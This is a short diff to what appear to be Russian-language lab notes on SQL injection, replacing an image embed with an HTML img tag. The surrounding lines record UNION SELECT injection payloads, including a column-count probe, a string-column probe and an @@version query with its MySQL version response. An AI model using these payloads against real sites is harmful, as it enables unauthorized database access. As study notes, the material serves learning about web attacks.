@@ -12,7 +12,9 @@
 'union+select+null,null+--+  200
 
 'union+select+'fff333',null+--+  первый строковый!
-![[Снимок-20.07.37.png]]
+
+  <img src="../../assets/Снимок-20.07.37.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 
 'union+select+@@version,null+--+   ответ   8.0.42-0ubuntu0.20.04.1
